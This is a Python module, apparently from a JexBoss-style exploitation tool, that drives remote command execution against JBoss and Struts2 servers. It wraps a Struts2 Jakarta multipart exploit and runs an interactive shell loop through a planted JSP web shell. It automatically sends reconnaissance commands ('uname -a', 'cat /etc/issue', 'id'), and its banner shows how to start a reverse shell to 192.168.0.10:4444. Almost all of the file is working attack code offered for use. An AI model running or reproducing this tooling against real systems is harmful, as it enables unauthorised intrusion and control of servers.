import logging
import sys
import traceback
from typing import Optional
from urllib.parse import urlencode

import urllib3
from urllib3 import PoolManager, BaseHTTPResponse
from urllib3 import ProxyManager
from urllib3 import make_headers
from urllib3.util import Timeout

from src.core.config import Config
from src.exploits.struts2 import exploit_struts2_jakarta_multipart
from src.utils.colors import Colors
from src.utils.misc import print_and_flush, get_random_user_agent


def get_http_pool(timeout: int = 5) -> PoolManager:
    """
    Создаёт экземпляр HTTP-пула с указанным таймаутом.
    :param timeout: Таймаут в секундах для HTTP-запросов
    :return: Объект PoolManager
    """
    return urllib3.PoolManager(timeout=timeout, retries=False)


def http_request(
        pool: PoolManager,
        method: str,
        url: str,
        headers: Optional[dict] = None,
        body: Optional[bytes | str] = None,
        redirect: bool = True,
) -> BaseHTTPResponse:
    """
    Унифицированная обёртка для выполнения HTTP-запросов через пул.
    :param pool: PoolManager
    :param method: 'GET' или 'POST'
    :param url: Полный URL запроса
    :param headers: Заголовки
    :param body: Тело запроса (str или bytes)
    :param redirect: Следовать за редиректами
    :return: HTTPResponse
    """
    return pool.request(
        method=method,
        url=url,
        headers=headers or {},
        body=body,
        redirect=redirect
    )


def shell_http_struts(url: str, cfg: Config, http_pool) -> None:
    def run(cmd: str) -> str:
        return exploit_struts2_jakarta_multipart(
            url,
            cmd,
            cookies=cfg.cookies,
            http_pool=http_pool  # <-- здесь прокидываем пул
        )

    output = run(cfg.cmd or "whoami")
    # Правим экранирование строк и печатаем
    print(output.replace("\\n", "\n"), end="")


def shell_http(url: str, shell_type: str) -> None:
    """
    Interactive HTTP shell for various endpoints.

    :param url: Target base URL
    :param shell_type: "jmx-console", "web-console", "admin-console", "JMXInvokerServlet" или Struts2
    """
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
    }
    if gl_args.disable_check_updates:
        headers["no-check-updates"] = "true"

    # Определяем путь в зависимости от типа оболочки
    if shell_type in ("jmx-console", "web-console", "admin-console"):
        path = "/jexws4/jexws4.jsp?"
    elif shell_type == "JMXInvokerServlet":
        path = "/invoker/JMXInvokerServlet/"
    else:
        path = "/jexws4/jexws4.jsp?"

    # Баннер
    print_and_flush("# ----------------------------------------- #\n")
    print_and_flush(
        Colors.GREEN + Colors.BOLD +
        " * For a Reverse Shell (like meterpreter =]), type something like:\n\n"
        "     Shell>jexremote=192.168.0.10:4444\n"
        "   Or other techniques (e.g. /bin/bash -i ...).\n" +
        Colors.ENDC
    )
    print_and_flush("# ----------------------------------------- #\n")

    # Начальная информация
    resp = ""
    for info_cmd in ["uname -a", "cat /etc/issue", "id"]:
        param = urlencode({"ppp": info_cmd})
        try:
            r = gl_http_pool.request("GET", url + path + param, redirect=False, headers=headers)
            resp += " " + str(r.data).split(">")[1]
        except Exception:
            print_and_flush(
                Colors.RED +
                " * Apparently an IPS is blocking requests. Disabling update checks...\n\n" +
                Colors.ENDC
            )
            logging.warning("Disabling checking for updates.", exc_info=traceback)
            headers["no-check-updates"] = "true"
            continue

    print_and_flush(resp.replace("\\n", "\n"), same_line=True)
    logging.info(f"Server {url} exploited!")

    while True:
        print_and_flush(Colors.BLUE + "[Type commands or \"exit\" to finish]" + Colors.ENDC)
        cmd = input("Shell> ").strip()
        if cmd.lower() == "exit":
            break
        param = urlencode({"ppp": cmd})
        try:
            r = gl_http_pool.request("GET", url + path + param, redirect=False, headers=headers)
        except Exception:
            print_and_flush(
                Colors.RED +
                " * Error contacting the command shell. Try again and see logs for details..." +
                Colors.ENDC
            )
            logging.error("Error contacting the command shell", exc_info=traceback)
            continue

        if r.status == 404:
            print_and_flush(Colors.RED + " * Error contacting the command shell. Try again later..." + Colors.ENDC)
            continue

        output = str(r.data)
        try:
            stdout = output.split("pre>")[1]
        except Exception:
            print_and_flush(Colors.RED + " * Error contacting the command shell. Try again later..." + Colors.ENDC)
            continue

        if "An exception occurred processing JSP page" in stdout:
            print_and_flush(
                Colors.RED + f" * Error executing command \"{cmd}\"." + Colors.ENDC
            )
        else:
            print_and_flush(stdout.replace("\\n", "\n"))


def configure_http_pool() -> None:
    """
    Настраивает глобальный HTTP-пул с учётом прокси и таймаутов.
    """
    global gl_http_pool

    timeout = (
        Timeout(connect=1.0, read=3.0)
        if gl_args.mode in ("auto-scan", "file-scan")
        else Timeout(connect=gl_args.timeout, read=6.0)
    )

    if gl_args.proxy:
        # проверяем, что указаны протоколы
        if not gl_args.proxy.startswith(("http://", "https://")) or (
                gl_args.host and not gl_args.host.startswith(("http://", "https://"))
        ):
            print_and_flush(
                f"{Colors.RED} * When using proxy, specify protocol for host and proxy (e.g. http://...).\n"
                f"{Colors.ENDC}"
            )
            logging.critical("Protocol not specified for proxy or host")
            sys.exit(1)
        try:
            if gl_args.proxy_cred:
                headers = make_headers(proxy_basic_auth=gl_args.proxy_cred)
                gl_http_pool = ProxyManager(
                    proxy_url=gl_args.proxy,
                    proxy_headers=headers,
                    timeout=timeout,
                    cert_reqs="CERT_NONE"
                )
            else:
                gl_http_pool = ProxyManager(
                    proxy_url=gl_args.proxy,
                    timeout=timeout,
                    cert_reqs="CERT_NONE"
                )
        except Exception:
            print_and_flush(
                f"{Colors.RED} * Error setting proxy. See logs for details.\n{Colors.ENDC}"
            )
            logging.critical("Error setting proxy", exc_info=traceback)
            sys.exit(1)
    else:
        gl_http_pool = PoolManager(timeout=timeout, cert_reqs="CERT_NONE")
